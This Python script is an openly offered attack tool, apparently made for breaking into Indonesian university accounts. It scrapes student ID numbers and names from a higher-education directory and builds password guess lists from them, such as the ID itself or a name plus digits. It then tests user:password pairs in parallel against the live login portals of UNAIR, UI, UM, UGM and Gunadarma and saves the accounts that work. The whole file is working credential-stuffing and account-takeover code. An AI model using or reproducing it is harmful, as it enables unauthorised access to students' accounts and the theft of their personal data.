import requests as req
from bs4 import BeautifulSoup as bs
import urllib.parse
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
from concurrent.futures import ThreadPoolExecutor as PoolExecutor
from concurrent.futures import ThreadPoolExecutor 
import concurrent.futures
import os, time, platform, hashlib, json, sys
import concurrent.futures
try:
	import requests as req
	from bs4 import BeautifulSoup as bs
except:
	os.system('pip install --upgrade pip')
	os.system('pip install requests bs4')
	os.system('clear')
	exit('Install Bahan Selesai\nSilahkan Restart Script')
else:
	GR = '\x1b[33;30;1m'
	R = '\x1b[33;31;1m'
	G = '\x1b[33;32;1m'
	Y = '\x1b[33;33;1m'
	BL = '\x1b[33;34;1m'
	P = '\x1b[33;35;1m'
	B = '\x1b[33;36;1m'
	W = '\x1b[33;37;1m'
	W2 = '\x1b[33;37;1m'
	W3 = '\x1b[33;31;1m'
	C = '\x1b[33;34;1m'
	C2 = '\x1b[33;36;1m'
	off = '\x1b[m'
	rv = platform.uname()
	me = rv.release
	aktif = []
	error = []
	result = []
	xtc = []
	yxc = []
	

def main():
	os.system('clear')
	gerak(f"{C}⟐•─────────────────────────────────────{C}•⟐ \n",0.0000001)
	gerak(f"{C}|{C}[{W}!{C}] {W}𝚃𝚘𝚘𝚕𝚜  : 𝚂𝚌𝚊𝚗𝚗𝚎𝚛 𝚄𝚗𝚒𝚟𝚎𝚛𝚜𝚒𝚝𝚊𝚜  {off}     {C}| \n",0.0000001)
	gerak(f"{C}|{C}[{W}√{C}] {W}𝚃𝚎𝚕𝚎   : https://t.me/Akbar218   {off}  {C}| \n",0.0000001)
	gerak(f"{C}⟐•─────────────────────────────────────{C}•⟐ \n",0.0000001)
	gerak(f"{C}|[{W}01{C}]{W3}➣ {W}SCAN FORLAP                      {C}| \n",0.0000001)
	gerak(f"{C}|[{W}02{C}]{W3}➣ {W}SCAN UNAIR                       {C}| \n",0.0000001)
	gerak(f"{C}|[{W}03{C}]{W3}➣ {W}SCAN UI                          {C}| \n",0.0000001)
	gerak(f"{C}|[{W}04{C}]{W3}➣ {W}SCAN UM                          {C}| \n",0.0000001)
	gerak(f"{C}|[{W}05{C}]{W3}➣ {W}SCAN UGM                         {C}| \n",0.0000001)
	gerak(f"{C}|[{W}06{C}]{W3}➣ {W}SCAN GUNADARMA                   {C}| \n",0.0000001)
	gerak(f"{C}⟐•─────────────────────────────────────•⟐ \n",0.0000001)
	gerak(f"{C}|{W} Fast Scanner                          {C}| \n",0.00000001)
	gerak(f"{C}|{W} Bisa Request Scan Univ Lain !!        {C}| \n",0.00000001)
	gerak(f"{C}|{W} Harus Ada Akun Univ Nya !!            {C}| \n",0.00000001)
	gerak(f"{C}⟐•─────────────────────────────────────•⟐ \n",0.0000001)
	select = input(f"\n{C}[{W}?{C}]{W} Pilih : ")
	if select == '1':
			grab()
	elif select == '2':
			xunair()
	elif select == '3':
			xui()
	elif select == '4':
			xum()
	elif select == '5':
			xugm()
	elif select == '6':
			xgundarma()
		

def simpan():
	print("")
	gerak(f"{C}[{W}!{C}] {W}Scan Telah Selesai ! \n",0.001)
	gerak(f"{C}[{W}+{C}]{W}{C} [{G}AKTIF{C}] {W}: {G}{len(aktif)}\n",0.001)
	gerak(f"{C}[{W}-{C}]{W}{C} [{R}ERROR{C}] {W}: {R}{len(error)}\n",0.001)
	gerak(f"{C}[{W}+{C}]{W} Akun Aktif Telah Tersimpan\n",0.001)
	gerak(f"{C}[{W}√{C}]{W} Telegram :{W} @Akbar218\n",0.001)
	print("")
	print(f"\r{C}[{W}1{C}]{W} Kembali Scan")
	print(f"\r{C}[{W}2{C}]{W} Exit")
	keluar = input(f"\n{C}[{W}?{C}]{W} Pilih : {W}")
	if keluar == "1":
	    main()
	elif keluar == "2":
	    exit()
        
def unair(i,usr, pwd):
	ses = req.Session()
	url = 'https://cybercampus.unair.ac.id/login.php'
	tok = bs(ses.get(url, timeout=10, verify=False).text, 'html.parser').findAll('input')
	dat = { 'mode':'login', 'username':usr, 'password':pwd, 'submit':'login'}
	post = bs(ses.post(url, data=dat, timeout=10, verify=False).text, 'html.parser').text
	if "Universitas Airlangga Cyber Campus" in post:
		print(f"{C}[{R}ERROR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		error.append(f"{usr}:{pwd}")
	else:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('unair_aktif.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")
			
def gundar(i,usr, pwd):
	ses = req.Session()
	url = 'https://studentsite.gunadarma.ac.id/index.php/site/login'
	tok = bs(ses.get(url, timeout=10, verify=False).text, 'html.parser').findAll('input')
	dat = { 'username':usr, 'password':pwd, 'submit':'login' }
	post = ses.post(url, data=dat)
	if "Akademik" in post.text:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('gunadarma_aktif.txt', 'a') as (save):
		    save.write(f"{usr}:{pwd}\n")
	else:
		print(f"{C}[{R}ERROR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		error.append(f"{usr}:{pwd}")
		
def ui(i, usr, pwd):
	ses = req.Session()
	url = 'https://sso.ui.ac.id/cas/login?service=http%3A%2F%2Fberanda.ui.ac.id%2Fpersonal%2F'
	row = ses.get(url).text
	tok = bs(row, 'html.parser').findAll('input')[2]['value']
	tok1 = bs(row, 'html.parser').findAll('input')[3]['value']
	dat = { 'username':usr, 'password':pwd, 'lt':tok, 'execution':tok1, '_eventId':'submit', 'login':'submit' }
	post = ses.post(url, data=dat).text
	if "Login" in post:
		print(f"{C}[{R}ERROR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		error.append(f"{usr}:{pwd}")
	else:
	   print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
	   aktif.append(f"{usr}:{pwd}")
	   with open('ui_aktif.txt', 'a') as (save):
		   save.write(f"{usr}:{pwd}\n")

def ugm(i,usr, pwd):
	ses = req.Session()
	url = 'https://sso.ugm.ac.id/cas/login'
	tok = bs(ses.get(url, timeout=10, verify=False).text, 'html.parser').findAll('input')
	dat = { 'username':usr, 'password':pwd, 'warn':'true', 'rememberMe':'true', 'lt':tok[4]['value'], '_eventId':'submit', 'Login':'submit' }
	post = ses.post(url, data=dat).text
	if "Single Sign On" in post:
		print(f"{C}[{R}ERROR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		error.append(f"{usr}:{pwd}")
	else:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('ugm_aktif.txt', 'a') as (save):
		    save.write(f"{usr}:{pwd}\n")
			
def um(i, usr, pwd):
	ses = req.Session()
	url = 'https://auth.um.ac.id/auth/core/service.php?AuthState=_27b832c2c5c1b5493987c453d249a4a46346a4bf84%3Ahttps%3A%2F%2Fauth.um.ac.id%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fsiakad.um.ac.id%26cookieTime%3D1633165472%26RelayState%3Dhttp%253A%252F%252Fsiakad.um.ac.id%252F'
	tok = bs(ses.get(url, timeout=10, verify=False).text, 'html.parser').findAll('input')
	hdr = { 'Host': 'auth.um.ac.id', 'Connection': 'keep-alive', 'Content-Length': '30', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Origin': 'http://auth.um.ac.id', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'http://auth.um.ac.id/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'id-ID,id;q=0.8,en-US;q=0.6,en;q=0.4'}
	dat = { 'username':usr,' password':pwd, 'AuthState': tok[3]['value'], 'submit':'LOGIN'}
	post = bs(ses.post(url, data=dat, timeout=10, verify=False).text, 'html.parser').text
	if "Halaman dialihkan" in post:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('um_aktif.txt', 'a') as (save):
		    save.write(f"{usr}:{pwd}\n")
	else:
		print(f"{C}[{R}ERROR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		error.append(f"{usr}:{pwd}")
                   
def gerak(z, t):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(t)
        
def stat(u):
	x = bs(req.get(u,verify=False).text,'html.parser').findAll('div',{'class':'pagination'})[0].findAll('a')[1]['href']
	z = int(x.split('/')[7:][0])//20
	return z

def collect(u):
	raw = bs(req.get(u,verify=False).text,'html.parser').find('table').findAll('tr')
	for i in range(len(raw)-1):
		dat = raw[i+1].findAll('td')
		yxc.append({'nim': dat[1].text.replace(" ",""), 'nama' : dat[2].text})

def cut(x):
	_ = x.split('/')[:7]
	_ = f'{_[0]}/{_[1]}/{_[2]}/{_[3]}/{_[4]}/{_[5]}/{_[6]}/'
	return _
	
def xunair():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(unair, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xui():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(ui, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xum():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(um, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xugm():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(ugm, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()
			
def xgundarma():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
			count = 1
			gerak(f"{C}[{W}+{C}]{W} Total {C}{len(lines)} {W}Baris Terdeteksi\n",0.001)
			print("")
			with ThreadPoolExecutor(max_workers=40) as crot:
				for line in lines:
					x = line.strip().split(':')
					crot.submit(gundar, count, x[0],x[1])
					count += 1
					continue
				time.sleep(0.25)
			simpan()

			

def grab():
	print(f"{B}[{W}1{B}]{W}nim : nim {off} : ")
	print(f"{B}[{W}2{B}]{W}nim : nama + Angka {off} : ")
	print(f"{B}[{W}3{B}]{W}nim : Nama + Angka {off} : ")
	_0 = input(f"\n{B}[{W}?{B}]{W} 𝙿𝚒𝚕𝚒𝚑 : ")
	_1 = cut(input(f"{B}[{W}?{B}]{W} 𝙼𝚊𝚜𝚞𝚔𝚊𝚗 𝙻𝚒𝚗𝚔 𝙳𝚊𝚛𝚒 𝚃𝚊𝚑𝚞𝚗 𝚂𝚎𝚖𝚎𝚜𝚝?? : "))
	_2 = input(f"{B}[{W}?{B}]{off}{W} File Save : ")
	_3 = stat(_1)
	if _0 == '1':
		print(f'{B}[{W}+{B}]{W} Total {B}{_3} {W}Halaman Terdeteksi')
		print("")
		for _ in range(int(_3)):
			print(f"{B}[{W}+{B}]{W} Sukses Membuat Wordlist Dari Halaman Ke  {B}{_+1}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			with open(_2,'a') as o_:
				o_.write(__+':'+__+'\n')
		done(_2)
	elif _0 == '2':
		print(f'{B}[{W}+{B}]{W} Total {B}{_3} {W}Halaman Terdeteksi')
		print("")
		for _ in range(int(_3)):
			print(f"{B}[{W}+{B}]{W} Sukses Membuat Wordlist Dari Halaman Ke  {B}{_+1}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			___ = json.loads(json.dumps(yxc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					 o_.write(__+':'+__+'\n')
					 o_.write(__+':'+'1234\n')
					 o_.write(__+':'+'12345\n')
					 o_.write(__+':'+'123456\n')
					 o_.write(__+':'+'1234567\n')
					 o_.write(__+':'+'12345678\n')
					 o_.write(__+':'+x[0].lower()+'123\n')
					 o_.write(__+':'+x[0].lower()+'1234\n')
					 o_.write(__+':'+x[0].lower()+'12345\n')
					 o_.write(__+':'+x[0].lower()+'123456\n')
					 o_.write(__+':'+x[0].lower()+'1234567\n')
					 o_.write(__+':'+x[0].lower()+'12345678\n')
					 o_.write(__+':'+x[0].lower()+'123456789\n')
					 o_.write(__+':'+x[1].lower()+'123\n')
					 o_.write(__+':'+x[1].lower()+'1234\n')
					 o_.write(__+':'+x[1].lower()+'12345\n')
					 o_.write(__+':'+x[1].lower()+'123456\n')
					 o_.write(__+':'+x[1].lower()+'1234567\n')
					 o_.write(__+':'+x[1].lower()+'12345678\n')
					 o_.write(__+':'+x[1].lower()+'123456789\n')
					 o_.write(__+':'+x[2].lower()+'123\n')
					 o_.write(__+':'+x[2].lower()+'1234\n')
					 o_.write(__+':'+x[2].lower()+'12345\n')
					 o_.write(__+':'+x[2].lower()+'123456\n')
					 o_.write(__+':'+x[2].lower()+'1234567\n')
					 o_.write(__+':'+x[2].lower()+'12345678\n')
					 o_.write(__+':'+x[2].lower()+'123456789\n')
					 o_.write(__+':'+x[0].lower()+'1\n')
					 o_.write(__+':'+x[0].lower()+'2\n')
					 o_.write(__+':'+x[0].lower()+'3\n')
					 o_.write(__+':'+x[0].lower()+'4\n')
					 o_.write(__+':'+x[0].lower()+'5\n')
					 o_.write(__+':'+x[0].lower()+'6\n')
					 o_.write(__+':'+x[0].lower()+'7\n')
					 o_.write(__+':'+x[0].lower()+'8\n')
					 o_.write(__+':'+x[0].lower()+'9\n')
					 o_.write(__+':'+x[0].lower()+'01\n')
					 o_.write(__+':'+x[0].lower()+'02\n')
					 o_.write(__+':'+x[0].lower()+'03\n')
					 o_.write(__+':'+x[0].lower()+'04\n')
					 o_.write(__+':'+x[0].lower()+'05\n')
					 o_.write(__+':'+x[0].lower()+'06\n')
					 o_.write(__+':'+x[0].lower()+'07\n')
					 o_.write(__+':'+x[0].lower()+'08\n')
					 o_.write(__+':'+x[0].lower()+'09\n')
					 o_.write(__+':'+x[0].lower()+'10\n')
					 o_.write(__+':'+x[0].lower()+'11\n')
					 o_.write(__+':'+x[0].lower()+'12\n')
					 o_.write(__+':'+x[0].lower()+'13\n')
					 o_.write(__+':'+x[0].lower()+'14\n')
					 o_.write(__+':'+x[0].lower()+'15\n')
					 o_.write(__+':'+x[0].lower()+'16\n')
					 o_.write(__+':'+x[0].lower()+'17\n')
					 o_.write(__+':'+x[0].lower()+'18\n')
					 o_.write(__+':'+x[0].lower()+'19\n')
					 o_.write(__+':'+x[0].lower()+'20\n')
					 o_.write(__+':'+x[0].lower()+'21\n')
					 o_.write(__+':'+x[0].lower()+'22\n')
					 o_.write(__+':'+x[0].lower()+'23\n')
					 o_.write(__+':'+x[0].lower()+'24\n')
					 o_.write(__+':'+x[0].lower()+'25\n')
					 o_.write(__+':'+x[0].lower()+'26\n')
					 o_.write(__+':'+x[0].lower()+'27\n')
					 o_.write(__+':'+x[0].lower()+'28\n')
					 o_.write(__+':'+x[0].lower()+'29\n')
					 o_.write(__+':'+x[0].lower()+'30\n')
					 o_.write(__+':'+x[0].lower()+'31\n')
					 o_.write(__+':'+x[0].lower()+'32\n')
					 o_.write(__+':'+x[1].lower()+'1\n')
					 o_.write(__+':'+x[1].lower()+'2\n')
					 o_.write(__+':'+x[1].lower()+'3\n')
					 o_.write(__+':'+x[1].lower()+'4\n')
					 o_.write(__+':'+x[1].lower()+'5\n')
					 o_.write(__+':'+x[1].lower()+'6\n')
					 o_.write(__+':'+x[1].lower()+'7\n')
					 o_.write(__+':'+x[1].lower()+'8\n')
					 o_.write(__+':'+x[1].lower()+'9\n')
					 o_.write(__+':'+x[1].lower()+'01\n')
					 o_.write(__+':'+x[1].lower()+'02\n')
					 o_.write(__+':'+x[1].lower()+'03\n')
					 o_.write(__+':'+x[1].lower()+'04\n')
					 o_.write(__+':'+x[1].lower()+'05\n')
					 o_.write(__+':'+x[1].lower()+'06\n')
					 o_.write(__+':'+x[1].lower()+'07\n')
					 o_.write(__+':'+x[1].lower()+'08\n')
					 o_.write(__+':'+x[1].lower()+'09\n')
					 o_.write(__+':'+x[1].lower()+'10\n')
					 o_.write(__+':'+x[1].lower()+'11\n')
					 o_.write(__+':'+x[1].lower()+'12\n')
					 o_.write(__+':'+x[1].lower()+'13\n')
					 o_.write(__+':'+x[1].lower()+'14\n')
					 o_.write(__+':'+x[1].lower()+'15\n')
					 o_.write(__+':'+x[1].lower()+'16\n')
					 o_.write(__+':'+x[1].lower()+'17\n')
					 o_.write(__+':'+x[1].lower()+'18\n')
					 o_.write(__+':'+x[1].lower()+'19\n')
					 o_.write(__+':'+x[1].lower()+'20\n')
					 o_.write(__+':'+x[1].lower()+'21\n')
					 o_.write(__+':'+x[1].lower()+'22\n')
					 o_.write(__+':'+x[1].lower()+'23\n')
					 o_.write(__+':'+x[1].lower()+'24\n')
					 o_.write(__+':'+x[1].lower()+'25\n')
					 o_.write(__+':'+x[1].lower()+'26\n')
					 o_.write(__+':'+x[1].lower()+'27\n')
					 o_.write(__+':'+x[1].lower()+'28\n')
					 o_.write(__+':'+x[1].lower()+'29\n')
					 o_.write(__+':'+x[1].lower()+'30\n')
					 o_.write(__+':'+x[1].lower()+'31\n')
					 o_.write(__+':'+x[1].lower()+'32\n')
					 o_.write(__+':'+x[2].lower()+'1\n')
					 o_.write(__+':'+x[2].lower()+'2\n')
					 o_.write(__+':'+x[2].lower()+'3\n')
					 o_.write(__+':'+x[2].lower()+'4\n')
					 o_.write(__+':'+x[2].lower()+'5\n')
					 o_.write(__+':'+x[2].lower()+'6\n')
					 o_.write(__+':'+x[2].lower()+'7\n')
					 o_.write(__+':'+x[2].lower()+'8\n')
					 o_.write(__+':'+x[2].lower()+'9\n')
					 o_.write(__+':'+x[2].lower()+'01\n')
					 o_.write(__+':'+x[2].lower()+'02\n')
					 o_.write(__+':'+x[2].lower()+'03\n')
					 o_.write(__+':'+x[2].lower()+'04\n')
					 o_.write(__+':'+x[2].lower()+'05\n')
					 o_.write(__+':'+x[2].lower()+'06\n')
					 o_.write(__+':'+x[2].lower()+'07\n')
					 o_.write(__+':'+x[2].lower()+'08\n')
					 o_.write(__+':'+x[2].lower()+'09\n')
					 o_.write(__+':'+x[2].lower()+'10\n')
					 o_.write(__+':'+x[2].lower()+'11\n')
					 o_.write(__+':'+x[2].lower()+'12\n')
					 o_.write(__+':'+x[2].lower()+'13\n')
					 o_.write(__+':'+x[2].lower()+'14\n')
					 o_.write(__+':'+x[2].lower()+'15\n')
					 o_.write(__+':'+x[2].lower()+'16\n')
					 o_.write(__+':'+x[2].lower()+'17\n')
					 o_.write(__+':'+x[2].lower()+'18\n')
					 o_.write(__+':'+x[2].lower()+'19\n')
					 o_.write(__+':'+x[2].lower()+'20\n')
					 o_.write(__+':'+x[2].lower()+'21\n')
					 o_.write(__+':'+x[2].lower()+'22\n')
					 o_.write(__+':'+x[2].lower()+'23\n')
					 o_.write(__+':'+x[2].lower()+'24\n')
					 o_.write(__+':'+x[2].lower()+'25\n')
					 o_.write(__+':'+x[2].lower()+'26\n')
					 o_.write(__+':'+x[2].lower()+'27\n')
					 o_.write(__+':'+x[2].lower()+'28\n')
					 o_.write(__+':'+x[2].lower()+'29\n')
					 o_.write(__+':'+x[2].lower()+'30\n')
					 o_.write(__+':'+x[2].lower()+'31\n')
					 o_.write(__+':'+x[2].lower()+'32\n')
			except:
				continue
		done(_2)
	elif _0 == '3':
		print(f'{B}[{W}+{B}]{W} Total {B}{_3} {W}Halaman Terdeteksi')
		akbar = input(f"{B}[{W}?{B}]{W} Masukan Angka : ")
		print("")
		for _ in range(int(_3)):
			print(f"{B}[{W}+{B}]{W} Sukses Membuat Wordlist Dari Halaman Ke  {B}{_+1}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(yxc)):
			__ = json.loads(json.dumps(yxc[_]))['nim']
			___ = json.loads(json.dumps(yxc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					 o_.write(__+':'+x[0].title()+'123\n')
					 o_.write(__+':'+x[0].title()+'1234\n')
					 o_.write(__+':'+x[0].title()+'12345\n')
					 o_.write(__+':'+x[0].title()+'123456\n')
					 o_.write(__+':'+x[0].title()+'1234567\n')
					 o_.write(__+':'+x[0].title()+'12345678\n')
					 o_.write(__+':'+x[0].title()+'123456789\n')
					 o_.write(__+':'+x[1].title()+'123\n')
					 o_.write(__+':'+x[1].title()+'1234\n')
					 o_.write(__+':'+x[1].title()+'12345\n')
					 o_.write(__+':'+x[1].title()+'123456\n')
					 o_.write(__+':'+x[1].title()+'1234567\n')
					 o_.write(__+':'+x[1].title()+'12345678\n')
					 o_.write(__+':'+x[1].title()+'123456789\n')
					 o_.write(__+':'+x[2].title()+'123\n')
					 o_.write(__+':'+x[2].title()+'1234\n')
					 o_.write(__+':'+x[2].title()+'12345\n')
					 o_.write(__+':'+x[2].title()+'123456\n')
					 o_.write(__+':'+x[2].title()+'1234567\n')
					 o_.write(__+':'+x[2].title()+'12345678\n')
					 o_.write(__+':'+x[2].title()+'123456789\n')
					 o_.write(__+':'+x[0].title()+'1\n')
					 o_.write(__+':'+x[0].title()+'2\n')
					 o_.write(__+':'+x[0].title()+'3\n')
					 o_.write(__+':'+x[0].title()+'4\n')
					 o_.write(__+':'+x[0].title()+'5\n')
					 o_.write(__+':'+x[0].title()+'6\n')
					 o_.write(__+':'+x[0].title()+'7\n')
					 o_.write(__+':'+x[0].title()+'8\n')
					 o_.write(__+':'+x[0].title()+'9\n')
					 o_.write(__+':'+x[0].title()+'01\n')
					 o_.write(__+':'+x[0].title()+'02\n')
					 o_.write(__+':'+x[0].title()+'03\n')
					 o_.write(__+':'+x[0].title()+'04\n')
					 o_.write(__+':'+x[0].title()+'05\n')
					 o_.write(__+':'+x[0].title()+'06\n')
					 o_.write(__+':'+x[0].title()+'07\n')
					 o_.write(__+':'+x[0].title()+'08\n')
					 o_.write(__+':'+x[0].title()+'09\n')
					 o_.write(__+':'+x[0].title()+'10\n')
					 o_.write(__+':'+x[0].title()+'11\n')
					 o_.write(__+':'+x[0].title()+'12\n')
					 o_.write(__+':'+x[0].title()+'13\n')
					 o_.write(__+':'+x[0].title()+'14\n')
					 o_.write(__+':'+x[0].title()+'15\n')
					 o_.write(__+':'+x[0].title()+'16\n')
					 o_.write(__+':'+x[0].title()+'17\n')
					 o_.write(__+':'+x[0].title()+'18\n')
					 o_.write(__+':'+x[0].title()+'19\n')
					 o_.write(__+':'+x[0].title()+'20\n')
					 o_.write(__+':'+x[0].title()+'21\n')
					 o_.write(__+':'+x[0].title()+'22\n')
					 o_.write(__+':'+x[0].title()+'23\n')
					 o_.write(__+':'+x[0].title()+'24\n')
					 o_.write(__+':'+x[0].title()+'25\n')
					 o_.write(__+':'+x[0].title()+'26\n')
					 o_.write(__+':'+x[0].title()+'27\n')
					 o_.write(__+':'+x[0].title()+'28\n')
					 o_.write(__+':'+x[0].title()+'29\n')
					 o_.write(__+':'+x[0].title()+'30\n')
					 o_.write(__+':'+x[0].title()+'31\n')
					 o_.write(__+':'+x[0].title()+'32\n')
					 o_.write(__+':'+x[1].title()+'1\n')
					 o_.write(__+':'+x[1].title()+'2\n')
					 o_.write(__+':'+x[1].title()+'3\n')
					 o_.write(__+':'+x[1].title()+'4\n')
					 o_.write(__+':'+x[1].title()+'5\n')
					 o_.write(__+':'+x[1].title()+'6\n')
					 o_.write(__+':'+x[1].title()+'7\n')
					 o_.write(__+':'+x[1].title()+'8\n')
					 o_.write(__+':'+x[1].title()+'9\n')
					 o_.write(__+':'+x[1].title()+'01\n')
					 o_.write(__+':'+x[1].title()+'02\n')
					 o_.write(__+':'+x[1].title()+'03\n')
					 o_.write(__+':'+x[1].title()+'04\n')
					 o_.write(__+':'+x[1].title()+'05\n')
					 o_.write(__+':'+x[1].title()+'06\n')
					 o_.write(__+':'+x[1].title()+'07\n')
					 o_.write(__+':'+x[1].title()+'08\n')
					 o_.write(__+':'+x[1].title()+'09\n')
					 o_.write(__+':'+x[1].title()+'10\n')
					 o_.write(__+':'+x[1].title()+'11\n')
					 o_.write(__+':'+x[1].title()+'12\n')
					 o_.write(__+':'+x[1].title()+'13\n')
					 o_.write(__+':'+x[1].title()+'14\n')
					 o_.write(__+':'+x[1].title()+'15\n')
					 o_.write(__+':'+x[1].title()+'16\n')
					 o_.write(__+':'+x[1].title()+'17\n')
					 o_.write(__+':'+x[1].title()+'18\n')
					 o_.write(__+':'+x[1].title()+'19\n')
					 o_.write(__+':'+x[1].title()+'20\n')
					 o_.write(__+':'+x[1].title()+'21\n')
					 o_.write(__+':'+x[1].title()+'22\n')
					 o_.write(__+':'+x[1].title()+'23\n')
					 o_.write(__+':'+x[1].title()+'24\n')
					 o_.write(__+':'+x[1].title()+'25\n')
					 o_.write(__+':'+x[1].title()+'26\n')
					 o_.write(__+':'+x[1].title()+'27\n')
					 o_.write(__+':'+x[1].title()+'28\n')
					 o_.write(__+':'+x[1].title()+'29\n')
					 o_.write(__+':'+x[1].title()+'30\n')
					 o_.write(__+':'+x[1].title()+'31\n')
					 o_.write(__+':'+x[1].title()+'32\n')
					 o_.write(__+':'+x[2].title()+'1\n')
					 o_.write(__+':'+x[2].title()+'2\n')
					 o_.write(__+':'+x[2].title()+'3\n')
					 o_.write(__+':'+x[2].title()+'4\n')
					 o_.write(__+':'+x[2].title()+'5\n')
					 o_.write(__+':'+x[2].title()+'6\n')
					 o_.write(__+':'+x[2].title()+'7\n')
					 o_.write(__+':'+x[2].title()+'8\n')
					 o_.write(__+':'+x[2].title()+'9\n')
					 o_.write(__+':'+x[2].title()+'01\n')
					 o_.write(__+':'+x[2].title()+'02\n')
					 o_.write(__+':'+x[2].title()+'03\n')
					 o_.write(__+':'+x[2].title()+'04\n')
					 o_.write(__+':'+x[2].title()+'05\n')
					 o_.write(__+':'+x[2].title()+'06\n')
					 o_.write(__+':'+x[2].title()+'07\n')
					 o_.write(__+':'+x[2].title()+'08\n')
					 o_.write(__+':'+x[2].title()+'09\n')
					 o_.write(__+':'+x[2].title()+'10\n')
					 o_.write(__+':'+x[2].title()+'11\n')
					 o_.write(__+':'+x[2].title()+'12\n')
					 o_.write(__+':'+x[2].title()+'13\n')
					 o_.write(__+':'+x[2].title()+'14\n')
					 o_.write(__+':'+x[2].title()+'15\n')
					 o_.write(__+':'+x[2].title()+'16\n')
					 o_.write(__+':'+x[2].title()+'17\n')
					 o_.write(__+':'+x[2].title()+'18\n')
					 o_.write(__+':'+x[2].title()+'19\n')
					 o_.write(__+':'+x[2].title()+'20\n')
					 o_.write(__+':'+x[2].title()+'21\n')
					 o_.write(__+':'+x[2].title()+'22\n')
					 o_.write(__+':'+x[2].title()+'23\n')
					 o_.write(__+':'+x[2].title()+'24\n')
					 o_.write(__+':'+x[2].title()+'25\n')
					 o_.write(__+':'+x[2].title()+'26\n')
					 o_.write(__+':'+x[2].title()+'27\n')
					 o_.write(__+':'+x[2].title()+'28\n')
					 o_.write(__+':'+x[2].title()+'29\n')
					 o_.write(__+':'+x[2].title()+'30\n')
					 o_.write(__+':'+x[2].title()+'31\n')
					 o_.write(__+':'+x[2].title()+'32\n')
					
			except:
				continue
	else:
			exit()

def stat(u):
	x = bs(req.get(u,verify=False).text,'html.parser').findAll('div',{'class':'pagination'})[0].findAll('a')[1]['href']
	z = int(x.split('/')[7:][0])//20
	return z

def collect(u):
	raw = bs(req.get(u,verify=False).text,'html.parser').find('table').findAll('tr')
	for i in range(len(raw)-1):
		dat = raw[i+1].findAll('td')
		yxc.append({'nim': dat[1].text.replace(" ",""), 'nama' : dat[2].text})

def cut(x):
	_ = x.split('/')[:7]
	_ = f'{_[0]}/{_[1]}/{_[2]}/{_[3]}/{_[4]}/{_[5]}/{_[6]}/'
	return _

def done(_2):
	print(f"\n{B}[{W}!{B}]{W} Wordlist Selesai Dibuat! ")
	print(f"{B}[{W}+{B}]{W} {len(yxc)}{W} Baris Telah Tersimpan Di Memory Internal ")
	print(f"{B}[{W}!{B}]{W} Wordlist Tersimpan Sebagai {B}{_2}")


if __name__ == '__main__':
	
	main()
	